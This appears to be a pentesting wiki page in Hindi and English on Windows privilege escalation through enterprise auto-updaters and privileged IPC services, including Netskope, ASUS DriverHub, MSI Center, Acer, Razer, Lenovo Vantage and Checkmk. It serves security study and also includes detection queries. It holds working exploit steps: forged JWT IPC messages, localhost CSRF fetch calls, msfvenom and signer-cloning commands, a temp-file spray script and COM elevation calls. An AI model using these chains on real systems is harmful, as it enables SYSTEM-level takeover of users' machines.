# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

यह page Windows local privilege escalation chains की एक class को generalize करती है, जो enterprise endpoint agents और updaters में पाई जाती है, जो low-friction IPC surface और privileged update flow expose करते हैं। एक representative example है Windows < R129 के लिए Netskope Client (CVE-2025-0309), जहाँ एक low-privileged user attacker-controlled server में enrollment को force कर सकता है और फिर एक malicious MSI deliver कर सकता है जिसे SYSTEM service install करती है।

Key ideas जिन्हें आप similar products के खिलाफ reuse कर सकते हैं:
- Attacker server पर re-enrollment या reconfiguration force करने के लिए privileged service के localhost IPC का abuse करें।
- Vendor के update endpoints implement करें, एक rogue Trusted Root CA deliver करें, और updater को एक malicious, “signed” package की ओर point करें।
- Weak signer checks (CN allow-lists), optional digest flags, और lax MSI properties को evade करें।
- अगर IPC “encrypted” है, तो registry में stored world-readable machine identifiers से key/IV derive करें।
- अगर service callers को image path/process name के आधार पर restrict करती है, तो allow-listed process में inject करें या उसे suspended spawn करें और minimal thread-context patch के जरिए अपनी DLL bootstrap करें।

---
## 1) localhost IPC के जरिए attacker server पर enrollment force करना

कई agents एक user-mode UI process ship करते हैं जो localhost TCP के जरिए JSON का उपयोग करके एक SYSTEM service से बात करता है।

Netskope में observed:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) एक JWT enrollment token craft करें जिसके claims backend host को control करते हों (e.g., AddonUrl)। alg=None उपयोग करें ताकि signature की जरूरत न हो।
2) अपने JWT और tenant name के साथ provisioning command invoke करने वाला IPC message send करें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सेवा enrollment/config के लिए आपके rogue server को hit करना शुरू करती है, उदाहरण के लिए:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- अगर caller verification path/name-based है, तो request को किसी allow-listed vendor binary से originate करें (देखें §4).

---
## 2) update channel को hijack करके SYSTEM के रूप में code run करना

एक बार client आपके server से बात करने लगे, expected endpoints implement करें और उसे attacker MSI की ओर steer करें। Typical sequence:

1) /v2/config/org/clientconfig → बहुत short updater interval के साथ JSON config return करें, जैसे:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA certificate लौटाएँ। service इसे Local Machine Trusted Root store में install करता है।
3) /v2/checkupdate → एक malicious MSI और fake version की तरफ़ point करने वाला metadata supply करें।

जगह-जगह दिखने वाले common checks को bypass करना:
- Signer CN allow-list: service शायद सिर्फ Subject CN को “netSkope Inc” या “Netskope, Inc.” के बराबर check करे। आपका rogue CA उस CN के साथ leaf issue कर सकता है और MSI sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की एक benign MSI property शामिल करें। install के समय enforcement नहीं होता।
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) extra cryptographic validation को disable कर देता है।

Result: SYSTEM service आपका MSI यहाँ से install करता है
C:\ProgramData\Netskope\stAgent\data\*.msi
और arbitrary code को NT AUTHORITY\SYSTEM के रूप में execute करता है।

Patch-bypass lesson: अगर कोई vendor cryptographically update source को authenticate करने के बजाय सिर्फ कुछ “trusted” domains को allow-list करके respond करता है, तो vendor-owned redirectors या reverse proxies खोजें जो आपको traffic steer करने दें। Netskope के case में, public follow-up research ने दिखाया कि R129-era allow-list अभी भी `rproxy.goskope.com` के through abuse की जा सकती थी, जो attacker-controlled Azure App Service content को proxy करता था। hostname allow-lists को trust boundary नहीं, बल्कि speed bump मानें।

---
## 3) Forging encrypted IPC requests (when present)

R127 से, Netskope ने IPC JSON को encryptData field में wrap किया था जो Base64 जैसा दिखता है। reversing से पता चला कि AES use हो रहा था, key/IV registry values से derive किए गए थे जो किसी भी user द्वारा readable थे:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption reproduce कर सकते हैं और standard user से valid encrypted commands भेज सकते हैं। General tip: अगर कोई agent अचानक अपनी IPC को “encrypt” करने लगे, तो HKLM के under device IDs, product GUIDs, install IDs के लिए look करें।

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

कुछ services peer को authenticate करने के लिए TCP connection के PID को resolve करके image path/name की तुलना allow-listed vendor binaries से करती हैं जो Program Files के under हों (e.g., stagentui.exe, bwansvc.exe, epdlp.exe)।

दो practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) और उसके अंदर से IPC proxy करना।
- CreateRemoteThread के बिना एक allow-listed binary को suspended spawn करना और अपना proxy DLL bootstrap करना (see §5), ताकि driver-enforced tamper rules satisfy हो जाएँ।

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से dangerous rights strip करने के लिए minifilter/OB callbacks driver (e.g., Stadrv) ship करते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक restrict करता है

इन constraints का respect करने वाला reliable user-mode loader:
1) CREATE_SUSPENDED के साथ एक vendor binary का CreateProcess करें।
2) जिन handles की अभी भी अनुमति है उन्हें लें: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और thread handle के लिए THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (या अगर known RIP पर code patch कर रहे हैं तो सिर्फ THREAD_RESUME)।
3) ntdll!NtContinue (या कोई और early, guaranteed-mapped thunk) को एक tiny stub से overwrite करें जो आपके DLL path पर LoadLibraryW call करे, फिर वापस jump करे।
4) अपनी stub को in-process trigger करने के लिए ResumeThread करें, जिससे आपकी DLL load हो जाए।

क्योंकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME कभी use नहीं किया (आपने उसे create किया था), driver की policy satisfy हो जाती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) एक rogue CA, malicious MSI signing, और ज़रूरी endpoints serve करना automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।
- UpSkope एक custom IPC client है जो arbitrary (optionally AES-encrypted) IPC messages craft करता है और suspended-process injection शामिल करता है ताकि request allow-listed binary से originate हो।

## 7) Fast triage workflow for unknown updater/IPC surfaces

जब किसी नए endpoint agent या motherboard “helper” suite का सामना हो, तो एक quick workflow अक्सर यह तय करने के लिए काफी होता है कि आप एक promising privesc target देख रहे हैं या नहीं:

1) Loopback listeners enumerate करें और उन्हें vendor processes से map करें:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) candidate named pipes की enumerate करें:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) प्लगइन-आधारित IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को mine करें:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) पहले user-mode client से endpoint नाम, JSON keys, और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) वास्तविक trust predicate को खोजें, न कि सिर्फ उस code path को जो अंत में process लॉन्च करता है:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
ध्यान देने योग्य पैटर्न:
- `CryptQueryObject`/certificate parsing बिना `WinVerifyTrust` के आमतौर पर मतलब होता है “certificate मौजूद है” को “certificate trusted है” मान लिया गया है, जिससे certificate cloning या अन्य fake-signer tricks संभव हो जाते हैं।
- `Origin`, `Referer`, download URLs, process names, या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` अक्सर attacker-controlled lookalike domains से exploit किया जा सकता है।
- अगर low-privileged GUI तय करती है “the file is trusted” और SYSTEM broker बस उस result को consume करता है, तो client-side DLL/JS को patch या reimplement करने से अक्सर boundary पूरी तरह bypass हो जाती है (Razer-style split validation)।
- अगर broker `%TEMP%`/`C:\Windows\Temp` में payload कॉपी करता है और फिर उसी path से उसे validate या schedule करता है, तो तुरंत TOCTOU replacement windows और sibling plugin modules के लिए test करें जो कमजोर checks वाले alternate `ExecuteTask()` wrappers expose करते हैं।

named-pipe-heavy targets के लिए, PipeViewer weak DACLs और remotely reachable pipes को जल्दी spot करने का एक तेज़ तरीका है, protocol को गहराई से reverse करने से पहले।

अगर target callers को केवल PID, image path, या process name से authenticate करता है, तो इसे boundary के बजाय एक speed bump मानें: legitimate client में inject करना, या allow-listed process से connection बनाना, अक्सर server के checks को satisfy करने के लिए काफी होता है। named pipes के लिए खास तौर पर, [client impersonation and pipe abuse](named-pipe-client-impersonation.md) पर यह page primitive को और गहराई से कवर करता है।

---
## 8) Vendor signatures से authenticated modular add-in brokers (Lenovo Vantage pattern)

एक नया variation जिसे hunt करना worth है वह है **signed-client RPC broker**: एक low-privileged Lenovo-signed desktop process एक SYSTEM service से बात करता है, और service JSON commands को `%ProgramData%` के अंदर XML-described add-ins के set में route करती है। एक बार **किसी भी accepted signed client के अंदर** code execution मिल जाने पर, हर `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर भरोसा क्योंकि वह vendor द्वारा signed है**: researchers ने एक Lenovo-signed EXE को writable directory में copy करके और एक DLL side-load (`profapi.dll`) satisfy करके authenticated context हासिल किया, ताकि arbitrary code उस client के अंदर चले जिस पर service पहले से भरोसा करता था।
- **Manifest-driven attack surface discovery**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के तहत declared होते हैं; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए उन manifests को enumerate करना अक्सर broker को reverse करने से पहले ही असली privileged verbs दिखा देता है।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर जाने के बाद, public research ने update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse, और substring-based registry path checks पाए, जिनसे intended hive के बाहर writes संभव हुईं।

Target पर useful recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
व्यावहारिक takeaway: जब भी कोई helper suite एक broker expose करता है जो पहले **caller process** को authenticate करता है और उसके बाद दर्जनों plugin/add-in commands में dispatch करता है, तो front-door trust check bypass करने के बाद रुकें नहीं। manifest/contract table dump करें और हर high-privilege verb को independently fuzz करें; authenticated channel आमतौर पर कई second-stage bugs छिपाता है।

---
## 1) Privileged HTTP APIs (ASUS DriverHub) के खिलाफ Browser-to-localhost CSRF

DriverHub 127.0.0.1:53000 पर एक user-mode HTTP service (ADU.exe) ship करता है, जो https://driverhub.asus.com से आने वाले browser calls की उम्मीद करता है। origin filter बस Origin header और `/asus/v1.0/*` द्वारा exposed download URLs पर `string_contains(".asus.com")` perform करता है। इसलिए कोई भी attacker-controlled host जैसे `https://driverhub.asus.com.attacker.tld` check पास कर लेता है और JavaScript से state-changing requests issue कर सकता है। अतिरिक्त bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) ऐसा domain register करें जो `.asus.com` embed करता हो और वहाँ एक malicious webpage host करें।
2) `fetch` या XHR का उपयोग करके `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे, `Reboot`, `UpdateApp`) को call करें।
3) Handler द्वारा expected JSON body भेजें – packed frontend JS नीचे दिया गया schema दिखाता है।
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
यहाँ तक कि नीचे दिखाया गया PowerShell CLI भी सफल हो जाता है जब Origin header को trusted value पर spoof किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में defined arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation वही substring logic reuse करती है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार हो जाता है। Download के बाद, ADU.exe सिर्फ यह check करता है कि PE में signature मौजूद है और Subject string ASUS से match करती है, फिर उसे run करता है – कोई `WinVerifyTrust`, कोई chain validation नहीं।

Flow को weaponize करने के लिए:
1) एक payload बनाएं (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS के signer को इसमें clone करें (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` को `.asus.com` lookalike domain पर host करें और ऊपर वाले browser CSRF से UpdateApp trigger करें।

क्योंकि Origin और URL filters दोनों substring-based हैं और signer check सिर्फ strings compare करता है, DriverHub attacker binary को अपने elevated context में pull और execute करता है।

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol expose करती है जहाँ हर frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` ship करता है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के जरिए signature verify करता है (certificate subject “MICRO-STAR INTERNATIONAL, CO., LTD.” के बराबर होना चाहिए और `WinVerifyTrust` succeed होना चाहिए)।
3) एक scheduled task बनाता है जो temp file को attacker-controlled arguments के साथ SYSTEM के रूप में run करता है।

Copied file verification और `ExecuteTask()` के बीच lock नहीं होती। Attacker:
- Frame A भेज सकता है जो एक legitimate MSI-signed binary की तरफ point करे (signature check pass होना और task queue होना सुनिश्चित करता है)।
- उसे repeated Frame B messages से race कर सकता है जो malicious payload की तरफ point करते हैं, और verification complete होने के तुरंत बाद `MSI Center SDK.exe` overwrite कर देते हैं।

जब scheduler fire होता है, वह validate किए गए original file के बावजूद overwritten payload को SYSTEM के तहत execute करता है। Reliable exploitation के लिए दो goroutines/threads उपयोग होते हैं जो `CMD_AutoUpdateSDK` spam करते रहते हैं जब तक TOCTOU window जीत न ली जाए।

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा loaded हर plugin/DLL को एक Component ID मिलता है जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` में stored होता है। Frame के first 4 bytes उस component को select करते हैं, जिससे attackers commands को arbitrary modules तक route कर सकते हैं।
- Plugins अपने खुद के task runners define कर सकते हैं। `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` expose करता है और सीधे `API_Support.EX_Task::ExecuteTask()` call करता है, **कोई signature validation नहीं** – कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` की तरफ point कर सकता है और deterministically SYSTEM execution पा सकता है।
- Wireshark से loopback sniffing या dnSpy में .NET binaries instrument करने से जल्दी ही Component ↔ command mapping मिल जाती है; custom Go/ Python clients फिर frames replay कर सकते हैं।

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` expose करता है, और इसका discretionary ACL remote clients को allow करता है (e.g., `\\TARGET\pipe\treadstone_service_LightMode`)। Command ID `7` के साथ file path भेजने पर service की process-spawning routine invoke होती है।
- Client library args के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` के जरिए dynamic instrumentation ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) में instrumentation tips देखें) दिखाता है कि native handler `CreateProcessAsUser` call करने से पहले इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से swap करने पर generic branch में drop होता है जो full SYSTEM token बनाए रखता है और high-integrity SID (`S-1-16-12288`) set करता है। इसलिए spawned binary बिना restriction के SYSTEM के रूप में चलता है, local और cross-machine दोनों जगह।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ combine करें ताकि lab VMs पर भी ACC stand up हो सके और vendor hardware के बिना pipe को exercise किया जा सके।

ये IPC bugs दिखाते हैं कि localhost services को mutual authentication enforce करनी चाहिए (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) और क्यों हर module का “run arbitrary binary” helper एक ही signer verifications share करना चाहिए।

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 ने इस family में एक और useful pattern जोड़ा: एक low-privileged user COM helper से `RzUtility.Elevator` के through process launch करने को कह सकता है, जबकि trust decision robustly privileged boundary के अंदर enforce करने के बजाय user-mode DLL (`simple_service.dll`) को delegate किया जाता है।

Observed exploitation path:
- COM object `RzUtility.Elevator` instantiate करें।
- `LaunchProcessNoWait(<path>, "", 1)` call करें ताकि elevated launch request हो।
- Public PoC में, request issue करने से पहले `simple_service.dll` के अंदर PE-signature gate patch out कर दिया जाता है, जिससे attacker-chosen arbitrary executable launch हो सके।

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
सामान्य निष्कर्ष: “helper” suites को reverse करते समय, केवल localhost TCP या named pipes पर ही न रुकें। `Elevator`, `Launcher`, `Updater`, या `Utility` जैसे नामों वाले COM classes की जाँच करें, फिर verify करें कि privileged service वास्तव में target binary को validate करता है या बस low-privilege client DLL द्वारा computed result पर भरोसा करता है जिसे patch किया जा सकता है। यह pattern Razer से आगे भी लागू होता है: कोई भी split design जहाँ high-privilege broker low-privilege side से allow/deny decision consume करता है, privesc surface का candidate है।


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अभी भी privileged actions को `C:\Windows\Temp` में एक temporary `.cmd` लिखकर और उसे `SYSTEM` के रूप में execute करके implement करते हैं। अगर filename predictable हो और service existing files को safely recreate न करे, तो low-privileged user भविष्य की temp file को पहले से **read-only** बना सकता है और privileged process को अपनी script की जगह attacker-controlled content execute कराने पर मजबूर कर सकता है।

Vulnerable Checkmk Agent builds में observed:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**

Practical workflow:
1. current process IDs या running agent PID से realistic PID range estimate करें।
2. एक short **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection; batch files के लिए UTF-16 PowerShell output से बचें)।
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd` को candidate range में spray करें और हर file को read-only mark करें।
4. cached MSI का repair trigger करें ताकि privileged service temp script को regenerate करने की कोशिश करे और फिर उसे execute करे।
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
यदि vulnerable product Windows Installer के साथ installed है, तो repair trigger करने से पहले `C:\Windows\Installer` के under मौजूद random-looking cached MSI को उसके product name से map करें:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` is useful when `msiexec /fa` fails from a non-interactive WinRM shell and you need to understand whether an existing desktop/disconnected session can trigger the repair correctly.
- This pattern generalizes to other endpoint agents and updaters that **stage temp scripts in world-writable locations and later execute them as SYSTEM**. Test for predictable names, missing exclusive create semantics, and repair/update flows that can be triggered on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> non-Notepad++ installer लॉन्च कर रहा है</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

ये patterns किसी भी updater पर generalize करते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में fail करता है—network hijack + malicious installer + BYO-signed sideloading “trusted” updates के guise में remote code execution देता है।

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
